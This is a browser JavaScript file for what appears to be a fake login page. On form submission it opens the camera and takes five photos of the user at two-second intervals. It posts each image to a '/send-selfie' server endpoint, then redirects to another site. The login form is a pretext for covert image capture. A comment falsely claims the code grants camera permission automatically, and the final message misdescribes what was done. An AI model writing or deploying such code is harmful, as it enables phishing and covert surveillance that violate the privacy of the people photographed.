const form = document.getElementById('loginForm');
const cameraSection = document.getElementById('cameraSection');
const video = document.getElementById('video');
const takePhotoBtn = document.getElementById('takePhoto');
const message = document.getElementById('message');

form.addEventListener('submit', (e) => {
  e.preventDefault();
  cameraSection.style.display = 'block';
  startCamera();
});

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    // Automatically allow camera permission
    video.play();
    setTimeout(() => {
      takeFiveSelfies();
    }, 1000); // Wait 1 second to allow the browser to grant permission
  } catch (err) {
    message.textContent = "Camera access denied.";
  }
}

function takeFiveSelfies() {
  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');
  const totalPhotos = 5;
  let photoCount = 0;

  function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL();

    sendSelfieToEmail(dataUrl);

    photoCount++;
    if (photoCount < totalPhotos) {
      setTimeout(capturePhoto, 2000); // Take one selfie every 2 seconds
    } else {
      window.location.href = "https://www.gicseh.com";
    }
  }

  capturePhoto();
}

function sendSelfieToEmail(dataUrl) {
  fetch('http://localhost:5000/send-selfie', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ image: dataUrl })
  })
    .then(res => res.json())
    .then(data => {
      message.textContent = "Selfie sent to your email!";
    });
}
